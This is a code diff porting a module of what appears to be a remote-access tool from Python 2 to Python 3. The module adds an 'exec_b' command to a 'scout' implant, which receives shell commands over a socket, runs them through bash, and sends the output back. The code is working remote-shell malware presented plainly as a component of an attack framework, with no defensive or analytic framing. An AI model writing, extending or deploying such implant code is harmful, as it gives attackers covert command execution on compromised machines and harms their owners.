@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -14,20 +13,20 @@ def exec_b(execute):
     if execute[:3] == 'cd ':
         execute = execute.replace('cd ', '', 1)
         chdir(execute)
-        s.sendall("[+]Changed to directory : " + execute)
+        s.sendall(("[+]Changed to directory : " + execute).encode())
     else:
         result = Popen(execute, executable='/bin/bash', shell=True, stdout=PIPE, stderr=PIPE,
                        stdin=PIPE)
         result = result.stdout.read() + result.stderr.read()        
-        s.sendall('[+]Command output : \\n' + result)''')
+        s.sendall(('[+]Command output : \\n' + result.decode()).encode())''')
         config.logics.append('''
             elif command == "exec_b":
                 exec_b(data)''')
         config.help_menu[
-            'exec_b <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash'
+            'exec_b <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash shell'
     elif option == 'info':
-        print '\nName             : Execute command CMD component' \
+        print('\nName             : Execute command CMD component' \
               '\nOS               : Linux' \
               '\nRequired Modules : subprocess' \
               '\nCommands         : exec_b <shell command>' \
-              '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash\n'
+              '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash\n')
